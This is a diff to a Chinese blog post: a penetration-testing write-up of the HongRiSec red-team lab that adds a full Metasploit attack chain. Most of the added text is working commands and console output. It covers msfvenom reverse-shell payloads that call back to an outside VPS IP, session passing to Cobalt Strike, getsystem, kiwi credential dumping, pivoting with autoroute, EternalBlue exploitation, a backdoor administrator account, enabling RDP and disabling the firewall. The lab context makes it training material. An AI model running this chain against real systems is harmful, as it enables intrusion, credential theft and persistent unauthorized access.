@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/failure.ico">
 <meta property="article:published_time" content="2024-03-20T12:15:36.000Z">
-<meta property="article:modified_time" content="2024-03-20T15:16:41.761Z">
+<meta property="article:modified_time" content="2024-03-21T05:11:08.830Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
@@ -178,7 +178,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        1376
+                        ~7.19K
                     
                     字
                 </li>
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1710947801761"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1710997868830"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -207,7 +207,7 @@
 <h1><span id="环境配置"> 环境配置</span></h1>
 <img src="/posts/57620/1.png" class title="awa">
 <p>三台机子：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win7 公网机 192.168.239.128 内网ip 192.168.52.143 密码hongrisec@2019</span><br><span class="line">windows 2003 192.168.52.141 密码HONGRISEC@2019</span><br><span class="line">windows 2008 192.168.52.138 密码HONGRISEC@2019</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win7 公网机 192.168.239.128 内网ip 192.168.52.143 密码hongrisec@2019</span><br><span class="line">windows 2003 192.168.52.141 密码HONGRISEC@2019 域控</span><br><span class="line">windows 2008 192.168.52.138 密码HONGRISEC@2019</span><br></pre></td></tr></table></figure>
 <p>公网机利用phpstudy开启了公网服务，公网访问<code>192.168.64.128</code></p>
 <img src="/posts/57620/2.png" class title="awa">
 <h2><span id="外网"> 外网</span></h2>
@@ -274,6 +274,109 @@
 <img src="/posts/57620/23.png" class title="awa">
 <img src="/posts/57620/24.png" class title="awa">
 <p>后面还会有msf的打法，先休息了（</p>
+<h2><span id="msf打法"> msf打法</span></h2>
+<p>这边用msf制作一个shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=ip lport=2333 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+<p>msf监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0</span><br><span class="line">lhost =&gt; 0.0.0.0</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 2333</span><br><span class="line">lport =&gt; 2333</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:2333</span><br></pre></td></tr></table></figure>
+<p>然后用蚁剑传上去执行：</p>
+<img src="/posts/57620/26.png" class title="awa">
+<p>shell就弹过来了：</p>
+<img src="/posts/57620/25.png" class title="awa">
+<p>这边可以将msf的shell派生给cs：</p>
+<h3><span id="msf派生cs"> msf派生cs</span></h3>
+<p>用2333端口的监听器，然后meterpreter：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost vps_ip</span><br><span class="line">set lport 2333</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>注意这里要用ip而不是0.0.0.0，而且要用reverse_http</p>
+<p>否则就弹不过来</p>
+<p>接下来的流程就和cs的一样了，net view扫内网然后按上面的流程打</p>
+<img src="/posts/57620/27.png" class title="awa">
+<p>这边就不展开，接着用msf打：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+<img src="/posts/57620/28.png" class title="awa">
+<p>这里就不像cs能直接扫到内网的ip了</p>
+<img src="/posts/57620/29.png" class title="awa">
+<p>查的结果很抽象</p>
+<p>这里还是先提权：</p>
+<p>msf可以直接getsystem，exit回到meterpreter，然后直接getsystem</p>
+<p>再回shell，已经是system权限了</p>
+<img src="/posts/57620/30.png" class title="awa">
+<p>导出密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+<p>发现不行：</p>
+<img src="/posts/57620/31.png" class title="awa">
+<p>这里有可能是因为32位的kiwi在64位的机子上运行了</p>
+<p>别急，重新起一个x64的windows shell试试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=106.52.94.23 lport=2333 -f exe -o shell2.exe</span><br></pre></td></tr></table></figure>
+<p>重新监听之后就好了</p>
+<img src="/posts/57620/33.png" class title="awa">
+<p>这里再额外讲一下meterpreter迁移：</p>
+<h3><span id="meterpreter迁移"> meterpreter迁移</span></h3>
+<p>其实是将meterpreter迁移到稳定的进程去，防止运行的shell被突然关掉</p>
+<p>这里利用ps查询进程</p>
+<img src="/posts/57620/32.png" class title="awa">
+<p>然后getpid查询meterpreter本身的进程号：</p>
+<img src="/posts/57620/34.png" class title="awa">
+<p>接下来找到一个稳定的进程，例如<code>explorer.exe</code>：</p>
+<img src="/posts/57620/35.png" class title="awa">
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 3348</span><br></pre></td></tr></table></figure>
+<p>刚刚session挂了，重新放一张成功的</p>
+<img src="/posts/57620/36.png" class title="awa">
+<p>成功迁移到了explorer.exe了</p>
+<h3><span id="横向移动"> 横向移动</span></h3>
+<p>这边在蚁剑ipconfig找网段：</p>
+<img src="/posts/57620/37.png" class title="awa">
+<p>发现了52网段</p>
+<p>传一个fscan，扫一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan64.exe -h 192.168.52.1-255</span><br></pre></td></tr></table></figure>
+<p>目录下result.txt生成结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.138:445 open</span><br><span class="line">192.168.52.138:139 open</span><br><span class="line">192.168.52.138:88 open</span><br><span class="line">192.168.52.141:7001 open</span><br><span class="line">192.168.52.143:3306 open</span><br><span class="line">192.168.52.141:445 open</span><br><span class="line">192.168.52.138:135 open</span><br><span class="line">192.168.52.143:445 open</span><br><span class="line">192.168.52.141:139 open</span><br><span class="line">192.168.52.141:135 open</span><br><span class="line">192.168.52.143:139 open</span><br><span class="line">192.168.52.143:135 open</span><br><span class="line">192.168.52.138:80 open</span><br><span class="line">192.168.52.143:80 open</span><br><span class="line">192.168.52.141:21 open</span><br><span class="line">192.168.52.141:7002 open</span><br><span class="line">192.168.52.141:8098 open</span><br><span class="line">192.168.52.141:8099 open</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.52.143</span><br><span class="line">   [-&gt;]stu1</span><br><span class="line">   [-&gt;]192.168.52.143</span><br><span class="line">   [-&gt;]192.168.239.128</span><br><span class="line">   [-&gt;]169.254.129.186</span><br><span class="line">[+] 192.168.52.143	MS17-010	(Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[+] 192.168.52.138	MS17-010	(Windows Server 2008 R2 Datacenter 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.52.141</span><br><span class="line">   [-&gt;]root-tvi862ubeh</span><br><span class="line">   [-&gt;]192.168.52.141</span><br><span class="line">[*] NetBios: 192.168.52.143  stu1.god.org                        Windows 7 Professional 7601 Service Pack 1 </span><br><span class="line">[*] WebTitle: http://192.168.52.138     code:200 len:689    title:IIS7</span><br><span class="line">[+] 192.168.52.141	MS17-010	(Windows Server 2003 3790)</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.52.138</span><br><span class="line">   [-&gt;]owa</span><br><span class="line">   [-&gt;]192.168.52.138</span><br><span class="line">[*] WebTitle: http://192.168.52.141:8099 code:403 len:1409   title:The page must be viewed over a secure channel</span><br><span class="line">[*] WebTitle: http://192.168.52.141:7002 code:200 len:2632   title:Sentinel Keys License Monitor</span><br><span class="line">[*] NetBios: 192.168.52.138  [+]DC owa.god.org                   Windows Server 2008 R2 Datacenter 7601 Service Pack 1 </span><br><span class="line">[*] WebTitle: http://192.168.52.143     code:200 len:14731  title:phpStudy 探针 2014</span><br><span class="line">[+] ftp://192.168.52.141:21:anonymous </span><br></pre></td></tr></table></figure>
+<p>筛掉这个靶机的<code>.143</code></p>
+<p>另外找到了<code>192.168.52.141</code>和<code>192.168.52.138</code></p>
+<p>建立52段的路由：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br><span class="line">run autoroute -p #查看路由状态</span><br></pre></td></tr></table></figure>
+<img src="/posts/57620/38.png" class title="awa">
+<p>看端口情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.138:445 open</span><br><span class="line">192.168.52.138:139 open</span><br><span class="line">192.168.52.138:88 open</span><br><span class="line">192.168.52.138:135 open</span><br><span class="line">192.168.52.138:80 open</span><br><span class="line"></span><br><span class="line">192.168.52.141:7001 open</span><br><span class="line">192.168.52.141:445 open</span><br><span class="line">192.168.52.141:139 open</span><br><span class="line">192.168.52.141:135 open</span><br><span class="line">192.168.52.141:21 open</span><br><span class="line">192.168.52.141:7002 open</span><br><span class="line">192.168.52.141:8098 open</span><br><span class="line">192.168.52.141:8099 open</span><br></pre></td></tr></table></figure>
+<p>都开了445，用永恒之蓝爆了</p>
+<p>这边先开<code>公网服务的3389</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开3389</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&quot; \&quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭3389</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre></td></tr></table></figure>
+<p>meterpreter执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
+<p>添加一下管理员：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user err0r hongrisec@2019 /add</span><br><span class="line">net localgroup administrators err0r /add</span><br><span class="line">net user err0r</span><br></pre></td></tr></table></figure>
+<img src="/posts/57620/39.png" class title="awa">
+<p>远程桌面连一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">err0r</span><br><span class="line">hongrisec@2019</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GOD\Administrator</span><br><span class="line">HONGRISEC@2019</span><br></pre></td></tr></table></figure>
+<p>就好了</p>
+<p>接下来就是拿永恒之蓝爆剩下的服务</p>
+<p>Administrator</p>
+<img src="/posts/57620/40.png" class title="awa">
+<h3><span id="拿下"> 拿下</span></h3>
+<p>141：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 106.52.94.23</span><br><span class="line">lhost =&gt; 106.52.94.23</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 6001</span><br><span class="line">lport =&gt; 6001</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOST 192.168.52.141</span><br><span class="line">RHOST =&gt; 192.168.52.141</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit </span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 106.52.94.23:6001:-  -</span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:6001 </span><br><span class="line">[*] 192.168.52.141:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.52.141:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2003 3790 x86 (32-bit)</span><br><span class="line">[*] 192.168.52.141:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.52.141:445 - The target is vulnerable.</span><br><span class="line">[-] 192.168.52.141:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>
+<img src="/posts/57620/41.png" class title="awa">
+<p>执行失败，不能用64位的</p>
+<p>换个方式打：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">set rport 445</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<img src="/posts/57620/42.png" class title="awa">
+<p>返回了<code>nt authority\system</code>，拿下system权限。这里只能一条命令一条命令输入</p>
+<p>开3389</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set command REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&quot; \&quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+<img src="/posts/57620/43.png" class title="awa">
+<p>fscan看到已经开了3389了，用刚刚公网的连一下：</p>
+<img src="/posts/57620/44.png" class title="awa">
+<p>拿下</p>
+<p>同样的操作拿下138的机子：</p>
+<img src="/posts/57620/45.png" class title="awa">
+<p>这边还得关下防火墙：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set command netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+<p>关掉防火墙之后就可以连上3389了</p>
+<img src="/posts/57620/46.png" class title="awa">
+<p>至此全部拿下</p>
 </div>
         </div>
         
@@ -366,7 +469,7 @@
                     <a class="tag-none-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-03-20T15:16:41.761Z" itemprop="dateModified">最后编辑：2024-03-20</time>
+                    <time datetime="2024-03-21T05:11:08.830Z" itemprop="dateModified">最后编辑：2024-03-21</time>
                 </div>
             </div>
         </footer>
